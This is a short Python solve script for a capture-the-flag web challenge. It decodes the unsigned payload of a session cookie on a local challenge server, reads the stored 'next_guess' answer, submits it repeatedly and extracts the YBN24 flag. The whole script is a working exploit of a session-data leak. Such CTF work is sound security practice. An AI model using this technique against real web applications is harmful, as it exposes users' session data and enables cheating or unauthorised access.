import base64
import json
import re

from requests import Session

URL = "http://127.0.0.1:8000/"


def solve():
    session = Session()

    session.get(URL)

    for _ in range(10):
        session_data = session.cookies.get("session")

        if session_data is None:
            print("[-] Failed to get session data")
            return

        data = session_data.split(".")[0]

        print("Got session data:", data)

        data = base64.b64decode(data + "==")

        data = json.loads(data)

        print("Successfully decoded session data:", data)

        resp = session.post(URL, data={"guess": data["next_guess"]})

    page = resp.text

    flag = re.findall("YBN24{.*}", page)[0]

    print("Flag:", flag)


if __name__ == "__main__":
    solve()
